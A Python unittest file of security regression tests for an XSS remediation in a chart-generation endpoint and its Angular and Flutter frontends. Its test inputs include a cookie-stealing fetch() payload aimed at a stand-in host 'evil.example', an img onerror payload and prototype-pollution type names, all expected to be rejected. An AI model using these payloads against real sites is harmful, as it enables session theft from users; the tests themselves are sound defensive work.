# Copyright 2026 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Security regression tests for /generate_viz XSS remediation (b/584427328)."""

import asyncio
import importlib.util
import json
import os
import re
import sys
import types
import unittest
from unittest import mock

import yaml

REPO_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))


def _load_visualize_agent_module():
    """Loads agents/VisualizeAgent.py hermetically without requiring GCP credentials."""
    with open(os.path.join(REPO_ROOT, "prompts.yaml"), "r", encoding="utf-8") as fh:
        prompts_data = yaml.safe_load(fh)

    mock_vertexai = types.ModuleType("vertexai")
    mock_vertexai.init = mock.MagicMock()

    mock_gen_models = types.ModuleType("vertexai.generative_models")

    class FakeHarmCategory:
        HARM_CATEGORY_HARASSMENT = "HARM_CATEGORY_HARASSMENT"
        HARM_CATEGORY_HATE_SPEECH = "HARM_CATEGORY_HATE_SPEECH"
        HARM_CATEGORY_SEXUALLY_EXPLICIT = "HARM_CATEGORY_SEXUALLY_EXPLICIT"
        HARM_CATEGORY_DANGEROUS_CONTENT = "HARM_CATEGORY_DANGEROUS_CONTENT"

    class FakeHarmBlockThreshold:
        BLOCK_NONE = "BLOCK_NONE"
        BLOCK_MEDIUM_AND_ABOVE = "BLOCK_MEDIUM_AND_ABOVE"

    mock_gen_models.GenerativeModel = mock.MagicMock()
    mock_gen_models.HarmCategory = FakeHarmCategory
    mock_gen_models.HarmBlockThreshold = FakeHarmBlockThreshold

    mock_google = types.ModuleType("google")
    mock_cloud = types.ModuleType("google.cloud")
    mock_aiplatform = types.ModuleType("google.cloud.aiplatform")
    mock_aiplatform.telemetry = mock.MagicMock()

    mock_utilities = types.ModuleType("utilities")
    mock_utilities.PROJECT_ID = "test-project"
    mock_utilities.PG_REGION = "us-central1"
    mock_utilities.PROMPTS = prompts_data
    mock_utilities.format_prompt = lambda prompt, **kwargs: prompt.format(**kwargs)

    mock_agents_pkg = types.ModuleType("agents")
    mock_agents_pkg.__path__ = [os.path.join(REPO_ROOT, "agents")]
    mock_core = types.ModuleType("agents.core")

    class FakeBaseAgent:
        agentType = "Agent"

    mock_core.Agent = FakeBaseAgent

    patched_modules = {
        "vertexai": mock_vertexai,
        "vertexai.generative_models": mock_gen_models,
        "google": mock_google,
        "google.cloud": mock_cloud,
        "google.cloud.aiplatform": mock_aiplatform,
        "utilities": mock_utilities,
        "agents": mock_agents_pkg,
        "agents.core": mock_core,
    }

    with mock.patch.dict(sys.modules, patched_modules):
        spec = importlib.util.spec_from_file_location(
            "agents.VisualizeAgent",
            os.path.join(REPO_ROOT, "agents", "VisualizeAgent.py"),
        )
        viz_mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(viz_mod)
    return viz_mod, FakeHarmBlockThreshold


class TestVisualizeAgentStructuredSpec(unittest.TestCase):
    """Tests VisualizeAgent structured JSON spec generation and sanitization."""

    @classmethod
    def setUpClass(cls):
        cls.viz_mod, cls.threshold_enum = _load_visualize_agent_module()

    def test_rejects_raw_javascript_poc_payload(self):
        poc_payload = (
            "document.title='PWNED-72e4c7eb';"
            "fetch('https://evil.example/steal?c='+encodeURIComponent(document.cookie))"
        )
        with self.assertRaises(ValueError):
            self.viz_mod.validate_chart_spec(poc_payload)

    def test_rejects_unknown_or_prototype_chart_types(self):
        for bad_type in ["__proto__", "constructor", "Function", "eval", "<script>", ""]:
            with self.subTest(bad_type=bad_type):
                with self.assertRaises(ValueError):
                    self.viz_mod.validate_chart_spec(
                        {
                            "chartType": bad_type,
                            "columns": ["A", "B"],
                            "rows": [["x", 1]],
                            "options": {},
                        }
                    )

    def test_normalizes_friendly_chart_types_and_forces_allow_html_false(self):
        raw = """```json
        {
          "chartType": "Bar Chart",
          "columns": ["Product SKU", "Orders"],
          "rows": [["SKU-1", 42], ["<img src=x onerror=alert(1)>", 10]],
          "options": {
            "title": "Top Products",
            "width": 600,
            "height": 300,
            "allowHtml": true,
            "evilCallback": "alert(1)"
          }
        }
        ```"""
        spec = self.viz_mod.validate_chart_spec(raw)
        self.assertEqual(spec["chartType"], "BarChart")
        self.assertEqual(spec["columns"], ["Product SKU", "Orders"])
        self.assertEqual(len(spec["rows"]), 2)
        self.assertFalse(spec["options"]["allowHtml"])
        self.assertNotIn("evilCallback", spec["options"])

    def test_rejects_non_primitive_cells_and_mismatched_rows(self):
        with self.assertRaises(ValueError):
            self.viz_mod.validate_chart_spec(
                {
                    "chartType": "Table",
                    "columns": ["Col1", "Col2"],
                    "rows": [["ok", {"nested": "bad"}]],
                }
            )
        with self.assertRaises(ValueError):
            self.viz_mod.validate_chart_spec(
                {
                    "chartType": "Table",
                    "columns": ["Col1", "Col2"],
                    "rows": [["only_one_cell"]],
                }
            )

    def test_generate_charts_uses_safe_thresholds_not_block_none(self):
        agent = self.viz_mod.VisualizeAgent()
        for threshold in agent.safety_settings.values():
            self.assertNotEqual(threshold, self.threshold_enum.BLOCK_NONE)
            self.assertEqual(threshold, self.threshold_enum.BLOCK_MEDIUM_AND_ABOVE)

        r0 = mock.MagicMock()
        r0.candidates = [mock.MagicMock(text='{"chart_1": "Bar Chart", "chart_2": "Table"}')]
        r1 = mock.MagicMock()
        r1.candidates = [
            mock.MagicMock(
                text=json.dumps(
                    {
                        "chartType": "BarChart",
                        "columns": ["Name", "Total"],
                        "rows": [["Alice", 10]],
                        "options": {"title": "Totals"},
                    }
                )
            )
        ]
        r2 = mock.MagicMock()
        r2.candidates = [
            mock.MagicMock(
                text=json.dumps(
                    {
                        "chartType": "Table",
                        "columns": ["Name", "Total"],
                        "rows": [["Alice", 10]],
                        "options": {"allowHtml": True},
                    }
                )
            )
        ]
        agent.model.generate_content.side_effect = [r0, r1, r2]

        charts = agent.generate_charts("Show totals", "SELECT name, total FROM t", [{"Name": "Alice", "Total": 10}])
        self.assertEqual(charts["chart_div"]["chartType"], "BarChart")
        self.assertEqual(charts["chart_div_1"]["chartType"], "Table")
        self.assertFalse(charts["chart_div_1"]["options"]["allowHtml"])
        for call in agent.model.generate_content.call_args_list:
            passed_safety = call.kwargs.get("safety_settings")
            self.assertIsNotNone(passed_safety)
            for val in passed_safety.values():
                self.assertNotEqual(val, self.threshold_enum.BLOCK_NONE)


class TestGenerateVizEndpointAndClients(unittest.TestCase):
    """Tests /generate_viz validation and client XSS sink removal."""

    def test_prompts_yaml_requests_json_spec_not_javascript(self):
        with open(os.path.join(REPO_ROOT, "prompts.yaml"), "r", encoding="utf-8") as fh:
            prompts = yaml.safe_load(fh)
        viz_prompt = prompts["visualize_generate_chart_code"]
        self.assertIn('"chartType"', viz_prompt)
        self.assertIn('"columns"', viz_prompt)
        self.assertIn('"rows"', viz_prompt)
        self.assertNotIn("evaluated as javascript", viz_prompt)
        self.assertNotIn("document.getElementById", viz_prompt)

    def test_opendataqna_passes_generated_sql_argument_to_visualize_agent(self):
        with open(os.path.join(REPO_ROOT, "opendataqna.py"), "r", encoding="utf-8") as fh:
            src = fh.read()
        self.assertIn("_viz.generate_charts(user_question, generated_sql, sql_results)", src)
        self.assertNotIn("_viz.generate_charts(user_question, generate_sql", src)

    def test_backend_generate_viz_rejects_raw_js_and_accepts_structured_spec(self):
        mock_flask = types.ModuleType("flask")

        class DummyResp:
            def __init__(self, data=None, status=200):
                self._data = data
                self.status_code = status

            def get_json(self):
                return self._data

        class DummyReq:
            def __init__(self):
                self.headers = {"Authorization": "Bearer valid_token"}
                self.data = b"{}"
                self.uid = None

        class DummyApp:
            def __init__(self, name):
                self.routes = {}

            def route(self, rule, methods=None):
                def dec(fn):
                    self.routes[rule] = fn
                    return fn
                return dec

        req_obj = DummyReq()
        mock_flask.Flask = DummyApp
        mock_flask.request = req_obj
        mock_flask.jsonify = lambda d: DummyResp(d, 200)
        mock_flask.Response = lambda status=200, response=None: DummyResp(response, status)
        mock_flask.render_template = mock.MagicMock()

        mock_fb = mock.MagicMock()
        mock_fb.auth.verify_id_token.return_value = {"uid": "user_1"}

        mock_odq = types.ModuleType("opendataqna")
        mock_odq.get_all_databases = mock.MagicMock()
        mock_odq.get_kgq = mock.MagicMock()
        mock_odq.generate_sql = mock.AsyncMock()
        mock_odq.embed_sql = mock.AsyncMock()
        mock_odq.get_response = mock.MagicMock()
        mock_odq.get_results = mock.MagicMock()
        mock_odq.visualize = mock.MagicMock()

        patched = {
            "flask": mock_flask,
            "flask_cors": mock.MagicMock(),
            "pandas": mock.MagicMock(),
            "firebase_admin": mock_fb,
            "firebase_admin.credentials": mock.MagicMock(),
            "firebase_admin.auth": mock_fb.auth,
            "opendataqna": mock_odq,
        }

        with mock.patch.dict(sys.modules, patched):
            spec = importlib.util.spec_from_file_location(
                "backend_apis_main_viz_test",
                os.path.join(REPO_ROOT, "backend-apis", "main.py"),
            )
            main_mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(main_mod)

            # 1. Raw JS payload returned by visualize() must be rejected (HTTP 500)
            mock_odq.visualize.return_value = (
                {
                    "chart_div": "document.title='PWNED';fetch('https://evil.example')",
                    "chart_div_1": "alert(1)",
                },
                False,
            )
            req_obj.data = json.dumps(
                {
                    "user_question": "q",
                    "sql_generated": "SELECT 1",
                    "sql_results": [{"a": 1}],
                    "session_id": "s1",
                }
            ).encode("utf-8")
            result = asyncio.run(main_mod.generateViz())
            resp_obj, status_code = result
            self.assertEqual(status_code, 500)
            self.assertEqual(resp_obj.get_json()["ResponseCode"], 500)

            # 2. Valid structured JSON chart specification succeeds and enforces allowHtml=False
            mock_odq.visualize.return_value = (
                {
                    "chart_div": {
                        "chartType": "BarChart",
                        "columns": ["Item", "Count"],
                        "rows": [["SKU1", 5]],
                        "options": {"title": "Counts", "allowHtml": True},
                    },
                    "chart_div_1": {
                        "chartType": "Table",
                        "columns": ["Item", "Count"],
                        "rows": [["SKU1", 5]],
                        "options": {},
                    },
                },
                False,
            )
            ok_resp = asyncio.run(main_mod.generateViz())
            body = ok_resp.get_json()
            self.assertEqual(body["ResponseCode"], 200)
            self.assertEqual(body["GeneratedChartjs"]["chart_div"]["chartType"], "BarChart")
            self.assertFalse(body["GeneratedChartjs"]["chart_div"]["options"]["allowHtml"])
            self.assertFalse(body["GeneratedChartjs"]["chart_div_1"]["options"]["allowHtml"])

    def test_angular_agent_chat_removes_eval_and_enforces_allowlist(self):
        ts_path = os.path.join(
            REPO_ROOT, "frontend", "src", "app", "agent-chat", "agent-chat.component.ts"
        )
        with open(ts_path, "r", encoding="utf-8") as fh:
            ts_src = fh.read()

        self.assertIsNone(re.search(r"\beval\s*\(", ts_src), "Angular component must not use eval()")
        self.assertIsNone(re.search(r"\bnew\s+Function\s*\(", ts_src), "Angular component must not use Function()")
        self.assertNotIn("innerHTML", ts_src)
        self.assertIn("ALLOWED_CHART_PACKAGES", ts_src)
        self.assertIn("google.visualization.arrayToDataTable", ts_src)
        self.assertIn("allowHtml: false", ts_src)

    def test_flutter_bot_screen_uses_json_spec_and_strict_csp(self):
        dart_path = os.path.join(
            REPO_ROOT, "frontend", "frontend-flutter", "lib", "screens", "bot.dart"
        )
        with open(dart_path, "r", encoding="utf-8") as fh:
            dart_src = fh.read()

        self.assertIn('type="application/json"', dart_src)
        self.assertIn("Content-Security-Policy", dart_src)
        self.assertIn("connect-src 'none'", dart_src)
        self.assertIn("NavigationActionPolicy.CANCEL", dart_src)
        self.assertIn(r"\u003c", dart_src)
        self.assertIn("'allowHtml': false", dart_src)
        self.assertNotIn('dataViz!["chart_div"]!.replaceAll', dart_src)
        self.assertNotIn('dataViz!["chart_div_1"]!.replaceAll', dart_src)


if __name__ == "__main__":
    unittest.main()
